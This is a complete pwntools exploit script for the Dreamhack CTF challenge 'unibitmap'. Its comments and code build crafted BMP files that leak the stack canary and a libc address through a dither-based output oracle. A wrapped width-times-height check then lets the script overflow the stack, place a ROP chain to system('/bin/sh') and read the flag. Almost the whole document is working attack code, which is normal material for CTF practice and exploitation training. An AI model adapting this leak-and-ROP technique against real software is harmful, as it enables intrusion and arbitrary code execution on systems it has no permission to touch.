#!/usr/bin/env python3
# unibitmap (Dreamhack pwnable) full exploit
#
# Vulnerabilities
#   (1) Arbitrary READ: bfOffBits is unbounded -> pixel_data can point up the stack.
#       The braille output is a yes/no oracle. Output pixel (0,0) is the first pixel in
#       Floyd-Steinberg raster order, so it has ZERO incoming dither error; its dot is
#       exactly ((sum of its 2x2 source block) >= 512). We place a 2x2 block whose bytes
#       are [K0, K1, prev, S] (K0,K1 controlled; prev = previously-leaked neighbour; S the
#       target byte) and binary-search K0+K1 -> S = 512 - prev - Ksum_flip. Leaking bytes
#       in increasing address order keeps 'prev' known. -> full, deterministic byte leak.
#
#   (2) OVERFLOW WRITE: process_image checks ceil_w<=0x200 and ceil_w*ceil_h<=0x10000 (32-bit).
#       Choosing width=0x200, height=-0x800000 makes the product wrap to 0 (passes) while the
#       loop count is huge. With scale=1 + width multiple of 4 the downscaled write is exactly
#       v1[i] = pixel_data[i], so we control every overflowing byte as it climbs up the stack:
#       canary (i=0x10008), saved regs, return addr (i=0x10048), and main's BMP header.
#       ceil_h is re-read from the header's height field each outer iteration; when the climb
#       overwrites that field (i=0x10076) with a small value the loop SELF-TERMINATES, the
#       epilogue's canary check passes (we wrote the leaked canary) and RET jumps to our ROP.
#
# ROP: system("/bin/sh") (libc-2.27), then `cat /flag`.

import struct, sys, time
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# ---------- config ----------
LOCAL_BIN = './95-unibitmap-10/unibitmap'
REMOTE    = ('host3.dreamhack.games', 19716)   # <-- put the real host/port from the challenge page

# libc-2.27 (from the provided .deb) offsets
OFF_SYSTEM = 0x4f4e0
OFF_BINSH  = 0x1b40fa
OFF_POPRDI = 0x2155f
OFF_RET    = 0x8aa
LIBC_ANCHOR = 0x21b97          # value at bmp+0x14028 == libc + this

# ---------- BMP builder (0x36 header, bfOffBits FIELD independent) ----------
def make_bmp(width, height, bitcount, bfOffField, pixeldata, bfSize=0xffffffff, biSize=0x28):
    h = bytearray(0x36); h[0:2] = b'BM'
    struct.pack_into('<I', h, 0x02, bfSize)
    struct.pack_into('<I', h, 0x0a, bfOffField & 0xffffffff)
    struct.pack_into('<I', h, 0x0e, biSize)
    struct.pack_into('<i', h, 0x12, width)
    struct.pack_into('<i', h, 0x16, height)
    struct.pack_into('<H', h, 0x1a, 1)
    struct.pack_into('<H', h, 0x1c, bitcount)
    struct.pack_into('<I', h, 0x1e, 0)
    return bytes(h) + pixeldata

# ---------- leak primitive ----------
STRIDE = 0x200
LW, LH, LBC, LSC, SIZE = 0x200, -6, 8, 2, 0x14000

def send_req(io, scale, bmp):
    io.send(b'%d %d\n' % (scale, len(bmp)) + bmp)

def leak_probe(io, T, prev_val, Ksum):
    bfOff = (T - 1) - STRIDE
    pd = bytearray(SIZE - 0x36)
    K0 = min(Ksum, 255); K1 = max(0, Ksum - 255)
    for idx, val in ((bfOff - 0x36, K0), (bfOff + 1 - 0x36, K1),
                     (bfOff + STRIDE - 0x36, prev_val & 0xff)):   # pd[STRIDE]==byte[T-1] if in our data
        if 0 <= idx < len(pd):
            pd[idx] = val
    send_req(io, LSC, make_bmp(LW, LH, LBC, bfOff, bytes(pd)))
    line = io.recvline()
    io.recvline(timeout=1)                # blank separator line
    if not line:
        return None
    v = ord(line.decode('utf-8', 'replace')[0]) - 0x2800
    return 1 if (0 <= v <= 0xff and (v & 1)) else 0

def leak_byte(io, T, prev):
    # Ksum in [0,510]; flip at Ksum = 512-prev-S. If even Ksum=510 gives no dot,
    # then prev+S < 2 -> S is 0 (zero-region) in all but the rare S=1,prev=0 case.
    if leak_probe(io, T, prev, 510) == 0:
        return 0
    if leak_probe(io, T, prev, 0) == 1:
        return (512 - prev) & 0xff
    lo, hi = 0, 510
    while lo < hi:
        mid = (lo + hi) // 2
        if leak_probe(io, T, prev, mid) == 1: hi = mid
        else: lo = mid + 1
    return (512 - prev - lo) & 0xff

def leak_range(io, start, end, prev0=0):
    out = {}; prev = prev0
    for T in range(start, end):
        prev = leak_byte(io, T, prev); out[T] = prev
    return out

# ---------- overflow / ROP ----------
def build_overflow(canary, libc_base):
    WIDTH, HEIGHT, BITCOUNT, SCALE, PDLEN = 0x200, -0x800000, 8, 1, 0x10200
    CAN, RET, WIDX, HIDX = 0x10008, 0x10048, 0x10072, 0x10076
    rop = b''.join([p64(libc_base + OFF_POPRDI),
                    p64(libc_base + OFF_BINSH),
                    p64(libc_base + OFF_RET),
                    p64(libc_base + OFF_SYSTEM)])
    pd = bytearray(PDLEN)
    pd[CAN:CAN+8] = struct.pack('<Q', canary)
    pd[RET:RET+len(rop)] = rop
    struct.pack_into('<i', pd, WIDX, WIDTH)   # keep stride valid across the climbing row
    struct.pack_into('<i', pd, HIDX, 1)       # shrink height -> loop self-terminates
    return SCALE, make_bmp(WIDTH, HEIGHT, BITCOUNT, 0x36, bytes(pd))

# ---------- driver ----------
def pwn(io):
    # canary: LSB is always 0x00, so start the chain at 0x14009 with prev=0
    can = leak_range(io, 0x14009, 0x14010, prev0=0)
    canary = int.from_bytes(bytes(can[T] for T in range(0x14009, 0x14010)), 'little') << 8
    # libc pointer sits at bmp+0x14028; start the prev-chain at 0x14020 (byte 0x1401f is a known 0)
    lk = leak_range(io, 0x14020, 0x14030, prev0=0)
    libc_ptr = int.from_bytes(bytes(lk[T] for T in range(0x14028, 0x14030)), 'little')
    libc_base = libc_ptr - LIBC_ANCHOR
    log.success("canary   = %#018x", canary)
    log.success("libc base= %#018x", libc_base)
    if canary & 0xff or libc_base & 0xfff:
        log.warning("sanity check failed (canary LSB / libc page align) -- leak may be off")
    scale, bmp = build_overflow(canary, libc_base)
    send_req(io, scale, bmp)
    time.sleep(0.3)
    io.sendline(b'cat /flag')
    time.sleep(0.3)
    try:
        data = io.recvrepeat(2)
        for ln in data.split(b'\n'):
            if b'DH{' in ln or b'flag' in ln.lower():
                log.success("FLAG: %s", ln.decode('latin1'))
        io.interactive()
    except Exception as e:
        log.warning("interact err: %s", e)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        io = remote(*REMOTE)
    else:
        io = process(LOCAL_BIN)
    pwn(io)
    io.close()